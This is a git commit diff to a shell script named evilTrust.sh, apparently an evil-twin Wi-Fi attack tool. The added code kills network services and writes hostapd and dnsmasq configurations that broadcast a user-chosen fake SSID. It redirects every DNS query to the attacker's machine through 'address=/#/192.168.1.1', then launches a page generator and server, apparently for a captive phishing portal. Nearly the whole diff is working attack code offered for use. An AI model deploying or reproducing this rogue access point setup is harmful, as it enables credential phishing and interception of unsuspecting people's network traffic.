323ce52cf067fb0414ebdcd30fc31152716efd4a
W r e n c h <134978254+Jeanpseven@users.noreply.github.com>
2023-12-26 18:33:54 -0300

    Atualizar o evilTrust.sh

--- evilTrust.sh
+++ evilTrust.sh
@@ -88,29 +88,73 @@ function startAttack() {
     echo -e "\nListing available network interfaces..."
     sleep 1
 
-    airmon-ng start wlan0 > /dev/null 2>&1
-    interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
+    interface=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | tr -d ':' > iface)
     counter=1
-    for interface in $(cat iface); do
-        echo -e "\t$counter. $interface"
-        sleep 0.26
+    for i in $(cat iface); do
+        printf "\e[1;92m%s\e[0m: \e[1;77m%s\n" $counter $i
         let counter++
     done
 
-    checker=0
-    while [ $checker -ne 1 ]; do
-        echo -ne "\nInterface name (e.g., wlan0mon): " && read choosed_interface
+    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Interface to use:\e[0m ' use_interface
+    choosed_interface=$(sed ''$use_interface'q;d' iface)
 
-        for interface in $(cat iface); do
-            if [ "$choosed_interface" == "$interface" ]; then
-                checker=1
-            fi
-        done
+    IFS=$'\n'
+    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] SSID to use:\e[0m ' use_ssid
+    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Channel to use:\e[0m ' use_channel
 
-        if [ $checker -eq 0 ]; then
-            echo -e "Invalid interface. Please choose a valid one."
-        fi
-    done
+    createpage
+
+    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Killing all connections..\e[0m\n"
+    sleep 2
+
+    killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
+    sleep 5
+
+    printf "interface=%s\n" $choosed_interface > hostapd.conf
+    printf "driver=nl80211\n" >> hostapd.conf
+    printf "ssid=%s\n" $use_ssid >> hostapd.conf
+    printf "hw_mode=g\n" >> hostapd.conf
+    printf "channel=%s\n" $use_channel >> hostapd.conf
+    printf "macaddr_acl=0\n" >> hostapd.conf
+    printf "auth_algs=1\n" >> hostapd.conf
+    printf "ignore_broadcast_ssid=0\n" >> hostapd.conf
+
+    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s down\n" $choosed_interface
+    ifconfig $choosed_interface down
+    sleep 4
+
+    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Setting %s to monitor mode\n" $choosed_interface
+    iwconfig $choosed_interface mode monitor
+    sleep 4
+
+    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s Up\n" $choosed_interface
+    ifconfig $choosed_interface up
+    sleep 5
+
+    hostapd hostapd.conf > /dev/null 2>&1 &
+    sleep 6
+
+    printf "interface=%s\n" $choosed_interface > dnsmasq.conf
+    printf "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
+    printf "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
+    printf "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
+    printf "server=8.8.8.8\n" >> dnsmasq.conf
+    printf "log-queries\n" >> dnsmasq.conf
+    printf "log-dhcp\n" >> dnsmasq.conf
+    printf "listen-address=127.0.0.1\n" >> dnsmasq.conf
+    printf "address=/#/192.168.1.1\n" >> dnsmasq.conf
+
+    ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
+    sleep 1
+
+    route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+    sleep 1
+
+    dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
+    sleep 5
+
+    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] To Stop: ./fakeap.sh --stop\n"
+    server
 }
 
 # Function calls in the desired order
